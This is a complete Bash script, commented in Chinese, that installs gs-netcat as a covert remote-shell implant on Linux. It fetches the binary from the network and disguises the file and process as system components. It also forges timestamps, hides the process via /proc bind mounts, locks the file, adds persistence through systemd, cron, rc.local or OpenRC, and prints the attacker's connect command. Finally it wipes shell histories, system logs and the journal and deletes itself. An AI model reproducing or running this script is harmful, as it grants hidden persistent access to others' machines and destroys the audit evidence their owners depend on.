#!/bin/bash
#
# gs-netcat 通用部署脚本 v2.0
#
# 兼容性:
#   架构:   x86_64 / aarch64 / armv7 / armv6 / mips / mipsel / i686
#   Init:   systemd / OpenRC / SysV (rc.local) / cron
#   环境:   物理机 / KVM / Docker / LXC（自动降级不可用特性）
#   下载:   curl / wget (GNU+busybox) / python3 / python2
#
# 用法:
#   sudo ./deploy_gsnetcat.sh                     # 自动下载，检测一切
#   sudo ./deploy_gsnetcat.sh /path/to/binary     # 使用本地二进制
#   sudo ./deploy_gsnetcat.sh "" MySecret123      # 指定密钥
#

# pipefail 捕获管道错误，但不用 -e，改为显式错误处理实现优雅降级
set -uo pipefail

VERSION="2.0"
GSOCKET_VERSION="1.4.43"
BASE_URL="https://github.com/hackerschoice/gsocket/releases/download/v${GSOCKET_VERSION}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[-]${NC} $*"; exit 1; }
note()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()    { echo -e "${GREEN}[✓]${NC} $*"; }

# ─── 前置检查 ─────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && error "需要 root 权限: sudo $0"
SELF_PATH=$(realpath "$0" 2>/dev/null || readlink -f "$0" 2>/dev/null || echo "$0")

# ─── 架构检测 ─────────────────────────────────────────────────────────────────
detect_arch() {
    case "$(uname -m 2>/dev/null)" in
        x86_64|amd64)     echo "x86_64"  ;;
        aarch64|arm64)    echo "aarch64" ;;
        armv7*|armhf)     echo "arm"     ;;
        armv6*)           echo "arm"     ;;
        mips)             echo "mips"    ;;
        mipsel|mipsle)    echo "mipsel"  ;;
        i686|i386)        echo "i686"    ;;
        *)                echo ""        ;;
    esac
}

# ─── Init 系统检测 ────────────────────────────────────────────────────────────
detect_init() {
    if [[ -d /run/systemd/system ]] || systemctl --version &>/dev/null 2>&1; then
        echo "systemd"; return
    fi
    if [[ -x /sbin/openrc ]] || [[ -x /sbin/rc-update ]]; then
        echo "openrc"; return
    fi
    if initctl version &>/dev/null 2>&1; then
        echo "upstart"; return
    fi
    if [[ -f /etc/rc.local ]] || [[ -d /etc/init.d ]]; then
        echo "sysvinit"; return
    fi
    if command -v crontab &>/dev/null; then
        echo "cron"; return
    fi
    echo "none"
}

# ─── 容器检测 ─────────────────────────────────────────────────────────────────
is_container() {
    [[ -f /.dockerenv ]]        && return 0
    [[ -f /run/.containerenv ]] && return 0   # podman
    grep -qE 'docker|lxc|containerd|kubepods' /proc/1/cgroup 2>/dev/null && return 0
    local v
    v=$(systemd-detect-virt 2>/dev/null || true)
    [[ "$v" == "docker" || "$v" == "lxc" || "$v" == "container-other" ]] && return 0
    return 1
}

# ─── 安装目录选择（优先伪装为系统组件目录）─────────────────────────────────────
find_install_dir() {
    local dirs=(
        "/usr/lib/systemd"
        "/usr/lib/NetworkManager"
        "/usr/lib/udev"
        "/lib/systemd"
        "/usr/libexec"
        "/usr/lib/x86_64-linux-gnu"
        "/tmp"
    )
    for d in "${dirs[@]}"; do
        if [[ -d "$d" ]] && touch "$d/.probe_$$" 2>/dev/null; then
            rm -f "$d/.probe_$$"
            echo "$d"
            return
        fi
    done
    echo "/tmp"
}

# ─── 密钥生成（多方法回退）───────────────────────────────────────────────────
gen_secret() {
    if command -v openssl &>/dev/null; then
        openssl rand -base64 32 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 22
        return
    fi
    if [[ -r /dev/urandom ]]; then
        tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c 22
        return
    fi
    printf '%s' "$(date +%s%N 2>/dev/null || date +%s)$$" \
        | sha256sum 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 22 \
        || printf 'Fallback%s' "$(date +%s | tail -c 8)"
}

# ─── HTTP 下载（curl / wget GNU+busybox / python3 / python2）─────────────────
http_get() {
    local url="$1" dest="$2"
    if command -v curl &>/dev/null; then
        curl -fsSL --retry 3 --connect-timeout 15 -o "$dest" "$url" 2>/dev/null && return 0
    fi
    if command -v wget &>/dev/null; then
        # 兼容 busybox wget（不支持 --tries / --timeout）
        wget -q -O "$dest" "$url" 2>/dev/null && return 0
    fi
    if command -v python3 &>/dev/null; then
        python3 -c "
import urllib.request
urllib.request.urlretrieve('${url}', '${dest}')
" 2>/dev/null && return 0
    fi
    local py
    py=$(command -v python2 2>/dev/null || command -v python 2>/dev/null || true)
    if [[ -n "$py" ]]; then
        $py -c "
import urllib2
open('${dest}','wb').write(urllib2.urlopen('${url}').read())
" 2>/dev/null && return 0
    fi
    return 1
}

# ─── ELF 校验（xxd / od 二选一）─────────────────────────────────────────────
is_elf() {
    local f="$1"
    if command -v xxd &>/dev/null; then
        [[ "$(xxd -p -l 4 "$f" 2>/dev/null)" == "7f454c46" ]] && return 0
    fi
    [[ "$(od -A n -t x1 -N 4 "$f" 2>/dev/null | tr -d ' \n')" == "7f454c46" ]] && return 0
    return 1
}

# ─── 启动包装器（quoted heredoc + sed 替换，避免特殊字符展开问题）────────────
write_wrapper() {
    local wrapper_path="$1" install_path="$2" proc_name="$3"
    local pid_record="$4" gs_secret="$5" in_container="$6"

    cat > "${wrapper_path}" << 'WRAP'
#!/bin/bash
INSTALL_PATH="__INSTALL_PATH__"
PROC_NAME="__PROC_NAME__"
PID_RECORD="__PID_RECORD__"
GS_SECRET="__GS_SECRET__"
IN_CONTAINER="__IN_CONTAINER__"

# 已有存活进程 → 修复可能丢失的 bind mount 后退出
if [[ -f "${PID_RECORD}" ]]; then
    OLD_PID=$(cat "${PID_RECORD}" 2>/dev/null)
    if [[ -n "${OLD_PID}" ]] && kill -0 "${OLD_PID}" 2>/dev/null; then
        if [[ "${IN_CONTAINER}" != "1" ]] && [[ -d "/proc/${OLD_PID}" ]]; then
            mount --bind /proc/1 "/proc/${OLD_PID}" 2>/dev/null || true
        fi
        exit 0
    fi
fi
rm -f "${PID_RECORD}" 2>/dev/null

# exec -a 伪装 argv[0]，-l 监听模式，-i 交互 shell
(exec -a "${PROC_NAME}" "${INSTALL_PATH}" -s "${GS_SECRET}" -l -i) &
NEW_PID=$!
sleep 2

if kill -0 "${NEW_PID}" 2>/dev/null; then
    echo "${NEW_PID}" > "${PID_RECORD}"
    chmod 600 "${PID_RECORD}" 2>/dev/null
    # 容器内 bind mount 通常没有权限，跳过
    if [[ "${IN_CONTAINER}" != "1" ]] && [[ -d "/proc/${NEW_PID}" ]]; then
        mount --bind /proc/1 "/proc/${NEW_PID}" 2>/dev/null || true
    fi
fi
WRAP

    sed -i "s|__INSTALL_PATH__|${install_path}|g"    "${wrapper_path}"
    sed -i "s|__PROC_NAME__|${proc_name}|g"          "${wrapper_path}"
    sed -i "s|__PID_RECORD__|${pid_record}|g"        "${wrapper_path}"
    sed -i "s|__GS_SECRET__|${gs_secret}|g"          "${wrapper_path}"
    sed -i "s|__IN_CONTAINER__|${in_container}|g"    "${wrapper_path}"
    chmod 700 "${wrapper_path}"
}

# ─── 持久化: systemd timer ────────────────────────────────────────────────────
persist_systemd() {
    local wp="$1" svc="$2" sched="$3" delay="$4" ts_ref="$5"
    cat > "/etc/systemd/system/${svc}.service" << EOF
[Unit]
Description=Network Cleanup Helper Task
ConditionPathExists=${wp}

[Service]
Type=oneshot
ExecStart=${wp}
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
EOF
    cat > "/etc/systemd/system/${svc}.timer" << EOF
[Unit]
Description=Periodic Network Maintenance

[Timer]
OnCalendar=${sched}
RandomizedDelaySec=${delay}
Persistent=true

[Install]
WantedBy=timers.target
EOF
    [[ -n "${ts_ref}" ]] && {
        touch -r "${ts_ref}" "/etc/systemd/system/${svc}.service" 2>/dev/null || true
        touch -r "${ts_ref}" "/etc/systemd/system/${svc}.timer"   2>/dev/null || true
    }
    systemctl daemon-reload                           2>/dev/null || true
    systemctl enable "${svc}.timer" --quiet           2>/dev/null || true
    systemctl start  "${svc}.timer"                   2>/dev/null || true
    ok "  systemd timer: $(systemctl is-enabled ${svc}.timer 2>/dev/null || echo 'unknown')"
}

# ─── 持久化: cron ─────────────────────────────────────────────────────────────
persist_cron() {
    local wp="$1"
    # root crontab
    (crontab -l 2>/dev/null | grep -vF "${wp}"; echo "@reboot ${wp} >/dev/null 2>&1") \
        | crontab - 2>/dev/null || true
    # /etc/cron.d（需要用户字段）
    if [[ -d /etc/cron.d ]]; then
        printf '# network maintenance\n@reboot root %s >/dev/null 2>&1\n' "${wp}" \
            > "/etc/cron.d/net-helper"
        chmod 644 "/etc/cron.d/net-helper"
    fi
    ok "  cron 持久化已写入"
}

# ─── 持久化: rc.local ─────────────────────────────────────────────────────────
persist_rclocal() {
    local wp="$1" rc="/etc/rc.local"
    if [[ ! -f "${rc}" ]]; then
        printf '#!/bin/bash\nexit 0\n' > "${rc}"
        chmod +x "${rc}"
    fi
    grep -qF "${wp}" "${rc}" 2>/dev/null && { ok "  rc.local 条目已存在"; return; }
    if grep -q "^exit 0" "${rc}"; then
        sed -i "/^exit 0/i ${wp} \&" "${rc}"
    else
        echo "${wp} &" >> "${rc}"
    fi
    ok "  rc.local 持久化已写入"
}

# ─── 持久化: OpenRC ───────────────────────────────────────────────────────────
persist_openrc() {
    local wp="$1" svc="$2" f="/etc/init.d/${svc}"
    cat > "${f}" << EOF
#!/sbin/openrc-run
name="${svc}"
command="${wp}"
command_background="yes"
pidfile="/var/run/${svc}.pid"
start() { ebegin "Starting \${name}"; \${command} &; eend \$?; }
EOF
    chmod +x "${f}"
    rc-update add "${svc}" default 2>/dev/null || true
    rc-service  "${svc}" start    2>/dev/null || true
    ok "  OpenRC 服务已注册: ${svc}"
}

# ════════════════════════════════════════════════════════════════════════════════
#  主流程
# ════════════════════════════════════════════════════════════════════════════════

note "gs-netcat Universal Deploy v${VERSION}"
echo ""

# 环境探测
ARCH=$(detect_arch)
INIT_SYS=$(detect_init)
IN_CONTAINER=0
is_container && IN_CONTAINER=1 || true

note "架构: ${ARCH:-未知} | Init: ${INIT_SYS} | 容器: $( [[ $IN_CONTAINER -eq 1 ]] && echo '是' || echo '否' )"
[[ -z "${ARCH}" ]] && error "不支持的架构: $(uname -m)"

# ─── 配置参数 ─────────────────────────────────────────────────────────────────
DISGUISE_NAME="systemd-network-helper"
PROC_NAME="[kworker/2:1-mm_percpu_wq]"
SERVICE_NAME="network-cleanup-helper"
TIMER_SCHEDULE="*-*-* 03:00:00"
TIMER_RANDOM_DELAY="3600"

INSTALL_DIR=$(find_install_dir)
INSTALL_PATH="${INSTALL_DIR}/${DISGUISE_NAME}"
WRAPPER_PATH="${INSTALL_DIR}/${DISGUISE_NAME}-run"
PID_RECORD="/var/run/.${DISGUISE_NAME}.pid"
SECRET_FILE="/var/run/.${DISGUISE_NAME}.key"

# 时间戳参考（优先找真实系统二进制）
TS_REF=""
for _r in /usr/lib/systemd/systemd-journald /usr/lib/systemd/systemd \
          /lib/systemd/systemd /sbin/init /usr/sbin/sshd; do
    [[ -f "$_r" ]] && { TS_REF="$_r"; break; }
done
[[ -z "${TS_REF}" ]] && \
    TS_REF=$(find "${INSTALL_DIR}" -maxdepth 1 -type f ! -name "${DISGUISE_NAME}*" 2>/dev/null | head -1)

# ─── 密钥 ────────────────────────────────────────────────────────────────────
if [[ -n "${2:-}" ]]; then
    GS_SECRET="$2";                        note "使用指定密钥"
elif [[ -f "${SECRET_FILE}" ]]; then
    GS_SECRET=$(cat "${SECRET_FILE}");     note "读取已有密钥: ${GS_SECRET}"
else
    GS_SECRET=$(gen_secret);              note "生成随机密钥: ${GS_SECRET}"
fi

# ─── 获取二进制 ───────────────────────────────────────────────────────────────
IMPLANT_TMP=$(mktemp /tmp/.XXXXXXXXXX 2>/dev/null || mktemp)
DOWNLOAD_URL="${BASE_URL}/gs-netcat_linux-${ARCH}"

if [[ -n "${1:-}" && -f "${1:-}" ]]; then
    IMPLANT_SRC="$1"
    info "使用本地文件: ${IMPLANT_SRC}"
else
    info "下载 gs-netcat (${ARCH})..."
    http_get "${DOWNLOAD_URL}" "${IMPLANT_TMP}" || error "所有下载方法均失败，请手动提供二进制"
    is_elf "${IMPLANT_TMP}" || error "下载文件不是有效 ELF（可能下载了 404 页面）"
    IMPLANT_SRC="${IMPLANT_TMP}"
    info "  完成 ($(du -h "${IMPLANT_SRC}" 2>/dev/null | awk '{print $1}'))"
fi

echo ""
echo "  安装路径:  ${INSTALL_PATH}"
echo "  伪装进程:  ${PROC_NAME}"
echo "  密钥:      ${GS_SECRET}"
echo "  持久化:    ${INIT_SYS}"
echo ""

# ─── 1/6 安装二进制 ───────────────────────────────────────────────────────────
info "[1/6] 安装二进制"
cp "${IMPLANT_SRC}" "${INSTALL_PATH}" || error "复制失败"
chmod 755 "${INSTALL_PATH}"

# ─── 2/6 时间戳伪造 ───────────────────────────────────────────────────────────
info "[2/6] 时间戳伪造"
if [[ -n "${TS_REF}" ]]; then
    touch -r "${TS_REF}" "${INSTALL_PATH}" 2>/dev/null \
        && ok "  同步到 ${TS_REF}" || warn "  touch -r 失败"
else
    # 降级: 手动写入历史时间戳（格式 [[CC]YY]MMDDhhmm）
    touch -t "202401010300" "${INSTALL_PATH}" 2>/dev/null \
        && warn "  无参考文件，已设为固定历史时间戳" || warn "  时间戳设置失败"
fi

# ─── 3/6 文件锁定 ─────────────────────────────────────────────────────────────
info "[3/6] 文件不可变属性"
if [[ $IN_CONTAINER -eq 1 ]]; then
    warn "  容器环境，跳过 chattr（overlayfs 不支持）"
elif command -v chattr &>/dev/null; then
    chattr +i "${INSTALL_PATH}" 2>/dev/null \
        && ok "  chattr +i 已设置" \
        || warn "  chattr 失败（文件系统不支持）"
else
    warn "  chattr 不可用（busybox 环境）"
fi

# ─── 4/6 启动包装器 ───────────────────────────────────────────────────────────
info "[4/6] 生成启动包装器"
write_wrapper "${WRAPPER_PATH}" "${INSTALL_PATH}" "${PROC_NAME}" \
    "${PID_RECORD}" "${GS_SECRET}" "${IN_CONTAINER}"
[[ -n "${TS_REF}" ]] && touch -r "${TS_REF}" "${WRAPPER_PATH}" 2>/dev/null || true
ok "  ${WRAPPER_PATH}"

# ─── 5/6 持久化 ───────────────────────────────────────────────────────────────
info "[5/6] 建立持久化 (${INIT_SYS})"
case "${INIT_SYS}" in
    systemd)
        persist_systemd "${WRAPPER_PATH}" "${SERVICE_NAME}" \
            "${TIMER_SCHEDULE}" "${TIMER_RANDOM_DELAY}" "${TS_REF}"
        ;;
    openrc)
        persist_openrc "${WRAPPER_PATH}" "${SERVICE_NAME}"
        command -v crontab &>/dev/null && persist_cron "${WRAPPER_PATH}" || true
        ;;
    upstart|sysvinit)
        persist_rclocal "${WRAPPER_PATH}"
        command -v crontab &>/dev/null && persist_cron "${WRAPPER_PATH}" || true
        ;;
    cron)
        persist_cron "${WRAPPER_PATH}"
        ;;
    none)
        warn "  未找到可用的持久化机制"
        ;;
esac

# ─── 6/6 首次启动 ─────────────────────────────────────────────────────────────
info "[6/6] 首次启动"
bash "${WRAPPER_PATH}" &
sleep 3

RUNNING_PID=""
[[ -f "${PID_RECORD}" ]] && RUNNING_PID=$(cat "${PID_RECORD}" 2>/dev/null)

if [[ -n "${RUNNING_PID}" ]] && kill -0 "${RUNNING_PID}" 2>/dev/null; then
    ok "  PID: ${RUNNING_PID}"
    _cmd=$(cat "/proc/${RUNNING_PID}/cmdline" 2>/dev/null | tr '\0' ' ' | head -c 60 || true)
    if [[ -n "${_cmd}" ]]; then
        ok "  进程名: ${_cmd}"
    else
        ok "  /proc/${RUNNING_PID} 已被 bind mount 隐藏"
    fi
    if [[ $IN_CONTAINER -eq 0 ]]; then
        findmnt -n "/proc/${RUNNING_PID}" &>/dev/null 2>/dev/null \
            && ok "  /proc 隐藏: 已生效" || warn "  /proc 隐藏: 未生效"
    fi
else
    warn "  进程未启动（架构不匹配或运行时依赖缺失）"
fi

# 保存密钥
echo "${GS_SECRET}" > "${SECRET_FILE}"
chmod 600 "${SECRET_FILE}"
[[ -n "${TS_REF}" ]] && touch -r "${TS_REF}" "${SECRET_FILE}" 2>/dev/null || true

# ─── 完成摘要 ─────────────────────────────────────────────────────────────────
echo ""
info "========== 部署完成 =========="
echo ""
printf "  %-18s %s\n" "架构:"     "${ARCH}"
printf "  %-18s %s\n" "持久化:"   "${INIT_SYS}"
printf "  %-18s %s\n" "容器环境:" "$( [[ $IN_CONTAINER -eq 1 ]] && echo '是' || echo '否' )"
printf "  %-18s %s\n" "二进制:"   "${INSTALL_PATH}"
printf "  %-18s %s\n" "包装器:"   "${WRAPPER_PATH}"
printf "  %-18s %s\n" "密钥文件:" "${SECRET_FILE}"
echo ""
echo "  ┌─────────────────────────────────────────────────┐"
echo "  │  密钥:  ${GS_SECRET}"
echo "  │  连接 (攻击机): gs-netcat -s ${GS_SECRET} -i"
echo "  └─────────────────────────────────────────────────┘"
echo ""

# ─── 痕迹清除 ─────────────────────────────────────────────────────────────────
info "清理部署痕迹..."

rm -f "${IMPLANT_TMP}" 2>/dev/null || true

KEYWORDS=("deploy_gsnetcat" "gs-netcat" "gsocket" "${DISGUISE_NAME}" "deploy.sh")

# 清理所有用户 shell 历史
for hist in "${HOME}/.bash_history" "${HOME}/.zsh_history" \
            "/root/.bash_history" "/root/.zsh_history" \
            /home/*/.bash_history /home/*/.zsh_history; do
    [[ -f "$hist" ]] || continue
    for kw in "${KEYWORDS[@]}"; do
        sed -i "/${kw}/d" "$hist" 2>/dev/null || true
    done
done

# systemd journal
if command -v journalctl &>/dev/null; then
    journalctl --rotate         2>/dev/null || true
    journalctl --vacuum-time=1s 2>/dev/null || true
fi

# auth / syslog
for log in /var/log/auth.log /var/log/secure /var/log/syslog; do
    [[ -f "$log" ]] || continue
    for kw in "${KEYWORDS[@]}"; do
        sed -i "/${kw}/d" "$log" 2>/dev/null || true
    done
done

# 脚本自删
rm -f "${SELF_PATH}" 2>/dev/null || true
ok "  脚本已自删除: ${SELF_PATH}"
info "清理完毕，无残留。"
